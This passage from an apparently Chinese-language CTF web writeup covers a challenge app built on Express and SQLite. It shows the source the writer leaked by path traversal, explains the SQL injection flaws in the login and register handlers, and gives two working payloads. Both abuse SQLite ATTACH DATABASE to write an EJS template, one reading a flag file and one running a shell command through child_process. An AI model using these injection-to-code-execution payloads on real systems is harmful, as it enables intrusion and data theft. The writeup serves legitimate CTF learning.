+<p>登进去之后是一个文件列表，下载处存在目录穿越</p>
+<p><img alt="image-20251008021010630" loading="lazy" src="../assets/image-20251008021010630.png"></p>
+<p>目录穿越有waf，但是不是很严格，可以直接../app.js读上层目录拿源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">  1</span><span class="cl"><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">  2</span><span class="cl"><span class="kr">const</span> <span class="nx">session</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express-session&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">  3</span><span class="cl"><span class="kr">const</span> <span class="nx">sqlite3</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;sqlite3&#39;</span><span class="p">).</span><span class="nx">verbose</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">  4</span><span class="cl"><span class="kr">const</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">  5</span><span class="cl"><span class="kr">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">  6</span><span class="cl">
+</span></span><span class="line"><span class="ln">  7</span><span class="cl"><span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">  8</span><span class="cl"><span class="kr">const</span> <span class="nx">db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">sqlite3</span><span class="p">.</span><span class="nx">Database</span><span class="p">(</span><span class="s1">&#39;./db.sqlite&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">  9</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 10</span><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="ln"> 11</span><span class="cl"><span class="cm">FLAG in /fla4444444aaaaaagg.txt
+</span></span></span><span class="line"><span class="ln"> 12</span><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="ln"> 13</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 14</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span> <span class="nx">extended</span><span class="o">:</span> <span class="kc">true</span> <span class="p">}));</span>
+</span></span><span class="line"><span class="ln"> 15</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="kr">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;public&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="ln"> 16</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">session</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln"> 17</span><span class="cl">  <span class="nx">secret</span><span class="o">:</span> <span class="s1">&#39;welcometoycb2025&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 18</span><span class="cl">  <span class="nx">resave</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 19</span><span class="cl">  <span class="nx">saveUninitialized</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 20</span><span class="cl">  <span class="nx">cookie</span><span class="o">:</span> <span class="p">{</span> <span class="nx">secure</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 21</span><span class="cl"><span class="p">}));</span>
+</span></span><span class="line"><span class="ln"> 22</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 23</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;views&#39;</span><span class="p">,</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;views&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln"> 24</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="s1">&#39;view engine&#39;</span><span class="p">,</span> <span class="s1">&#39;ejs&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 25</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 26</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 27</span><span class="cl"><span class="kr">const</span> <span class="nx">checkPermission</span> <span class="o">=</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 28</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">path</span> <span class="o">===</span> <span class="s1">&#39;/login&#39;</span> <span class="o">||</span> <span class="nx">req</span><span class="p">.</span><span class="nx">path</span> <span class="o">===</span> <span class="s1">&#39;/register&#39;</span><span class="p">)</span> <span class="k">return</span> <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 29</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 30</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">isAdmin</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;无权限访问&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 31</span><span class="cl">  <span class="nx">next</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 32</span><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="ln"> 33</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 34</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">checkPermission</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 35</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 36</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 37</span><span class="cl">  <span class="nx">fs</span><span class="p">.</span><span class="nx">readdir</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;documents&#39;</span><span class="p">),</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">files</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 38</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 39</span><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;读取目录时发生错误:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 40</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;目录读取失败&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 41</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 42</span><span class="cl">    <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">files</span> <span class="o">=</span> <span class="nx">files</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 43</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;files&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">files</span><span class="p">,</span> <span class="nx">user</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 44</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 45</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 46</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 47</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 48</span><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 49</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 50</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 51</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 52</span><span class="cl">  <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;register&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 53</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 54</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 55</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 56</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 57</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;upload&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="nx">user</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 58</span><span class="cl">    <span class="c1">//todoing
+</span></span></span><span class="line"><span class="ln"> 59</span><span class="cl"><span class="c1"></span><span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 60</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 61</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logout&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 62</span><span class="cl">  <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">destroy</span><span class="p">(</span><span class="nx">err</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 63</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 64</span><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;退出时发生错误:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 65</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;退出失败&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 66</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 67</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 68</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 69</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 70</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 71</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="kr">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 72</span><span class="cl">    <span class="kr">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 73</span><span class="cl">    <span class="kr">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 74</span><span class="cl">    <span class="kr">const</span> <span class="nx">sql</span> <span class="o">=</span> <span class="sb">`SELECT * FROM users WHERE (username = &#34;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&#34;) AND password = (&#34;</span><span class="si">${</span><span class="nx">password</span><span class="si">}</span><span class="sb">&#34;)`</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 75</span><span class="cl">    <span class="nx">db</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span><span class="kr">async</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">user</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 76</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 77</span><span class="cl">            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">401</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;账号密码出错！！&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 78</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 79</span><span class="cl">        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">id</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span> <span class="nx">isAdmin</span><span class="o">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">is_admin</span> <span class="p">};</span>
+</span></span><span class="line"><span class="ln"> 80</span><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 81</span><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 82</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 83</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 84</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 85</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 86</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 87</span><span class="cl">  <span class="kr">const</span> <span class="p">{</span> <span class="nx">username</span><span class="p">,</span> <span class="nx">password</span><span class="p">,</span> <span class="nx">confirmPassword</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 88</span><span class="cl">  
+</span></span><span class="line"><span class="ln"> 89</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">password</span> <span class="o">!==</span> <span class="nx">confirmPassword</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 90</span><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;两次输入的密码不一致&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 91</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 92</span><span class="cl">  
+</span></span><span class="line"><span class="ln"> 93</span><span class="cl">  <span class="nx">db</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="sb">`INSERT INTO users (username, password) VALUES (&#39;</span><span class="si">${</span><span class="nx">username</span><span class="si">}</span><span class="sb">&#39;, &#39;</span><span class="si">${</span><span class="nx">password</span><span class="si">}</span><span class="sb">&#39;)`</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 94</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 95</span><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;注册失败:&#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 96</span><span class="cl">      <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;注册失败，用户名可能已存在&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 97</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 98</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 99</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">100</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln">101</span><span class="cl">
+</span></span><span class="line"><span class="ln">102</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/download&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">103</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">104</span><span class="cl">  <span class="kr">const</span> <span class="nx">filename</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">105</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">filename</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">||</span><span class="nx">filename</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;./&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">106</span><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;WAF&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">107</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">108</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">filename</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;../../&#39;</span><span class="p">)</span><span class="o">||</span><span class="nx">filename</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;.././&#39;</span><span class="p">)</span><span class="o">||</span><span class="nx">filename</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;f&#39;</span><span class="p">)</span><span class="o">||</span><span class="nx">filename</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;//&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">109</span><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;WAF&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">110</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">111</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">filename</span> <span class="o">||</span> <span class="nx">path</span><span class="p">.</span><span class="nx">isAbsolute</span><span class="p">(</span><span class="nx">filename</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">112</span><span class="cl">    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;无效文件名&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">113</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">114</span><span class="cl">  <span class="kr">const</span> <span class="nx">filePath</span> <span class="o">=</span> <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;documents&#39;</span><span class="p">,</span> <span class="nx">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">115</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">filePath</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">116</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">download</span><span class="p">(</span><span class="nx">filePath</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">117</span><span class="cl">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">118</span><span class="cl">    <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">404</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;文件不存在&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">119</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">120</span><span class="cl"><span class="p">});</span>
+</span></span><span class="line"><span class="ln">121</span><span class="cl">
+</span></span><span class="line"><span class="ln">122</span><span class="cl">
+</span></span><span class="line"><span class="ln">123</span><span class="cl">
+</span></span><span class="line"><span class="ln">124</span><span class="cl"><span class="kr">const</span> <span class="nx">PORT</span> <span class="o">=</span> <span class="mi">80</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">125</span><span class="cl"><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">PORT</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">126</span><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Server running on http://localhost:</span><span class="si">${</span><span class="nx">PORT</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">127</span><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>可以看到upload是没有ejs文件的</p>
+<p><img alt="image-20251008021633861" loading="lazy" src="../assets/image-20251008021633861.png"></p>
+<p>而且在login和register处是存在sql注入的</p>
+<p>但是这里有一个坑就是login处的db.get函数不支持执行多条sql语句，也就是说不能堆叠注入。而在register处的db.exec是支持的。</p>
+<p>所以我们可以在register处通过sqlite创建数据库文件的方式，去写ejs模板，打ejs模板渲染</p>
+<p>payload</p>
+<pre tabindex="0"><code>admin&#39;);ATTACH DATABASE &#39;/app/views/upload.ejs&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;h1&gt;&lt;%- include(&#34;/fla4444444aaaaaagg.txt&#34;); %&gt;&lt;/h1&gt;&#39;);/*
+</code></pre><p><img alt="image-20251008022232879" loading="lazy" src="../assets/image-20251008022232879.png"></p>
+<p>也可以直接RCE去读</p>
+<pre tabindex="0"><code>123&#39;);ATTACH DATABASE &#39;/app/views/upload.ejs&#39; AS shell;create TABLE shell.exp (payload text); insert INTO shell.exp (payload) VALUES (&#39;&lt;h1&gt;&lt;%=process.mainModule.require(&#34;child_process&#34;).execSync(&#34;cat /fla4444444aaaaaagg.txt&#34;) %&gt;&lt;/h1&gt;&#39;);/*
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://blog.xrntkk.top/tags/writeup/">Writeup</a></li>
+      <li><a href="https://blog.xrntkk.top/tags/ctf/">Ctf</a></li>
+      <li><a href="https://blog.xrntkk.top/tags/web/">Web</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://blog.xrntkk.top/post/lilctf_2025/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>LilCTF-2025-Web-Writeup</span>
+  </a>
+</nav>
+
+  </footer><div id="tw-comment"></div>
+<script>
+    
+    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
+    const setGiscusTheme = () => {
+        const sendMessage = (message) => {
+            const iframe = document.querySelector('iframe.giscus-frame');
+            if (iframe) {
+                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
+            }
+        }
+        sendMessage({setConfig: {theme: getStoredTheme()}})
+    }
+
+    document.addEventListener("DOMContentLoaded", () => {
+        const giscusAttributes = {
+            "src": "https://giscus.app/client.js",
+            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
+            "data-repo-id": "xxxxxx",
+            "data-category": "Announcements",
+            "data-category-id": "xxxxx",
+            "data-mapping": "pathname",
+            "data-strict": "0",
+            "data-reactions-enabled": "1",
+            "data-emit-metadata": "0",
+            "data-input-position": "bottom",
+            "data-theme": getStoredTheme(),
+            "data-lang": "zh-CN",
+            "data-loading": "lazy",
+            "crossorigin": "anonymous",
+        };
+
+        
+        const giscusScript = document.createElement("script");
+        Object.entries(giscusAttributes).forEach(
+                ([key, value]) => giscusScript.setAttribute(key, value));
+        document.querySelector("#tw-comment").appendChild(giscusScript);
+
+        
+        const themeSwitcher = document.querySelector("#theme-toggle");
+        if (themeSwitcher) {
+            themeSwitcher.addEventListener("click", setGiscusTheme);
+        }
+        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
+        if (themeFloatSwitcher) {
+            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
+        }
+    });
+</script>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 
+
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
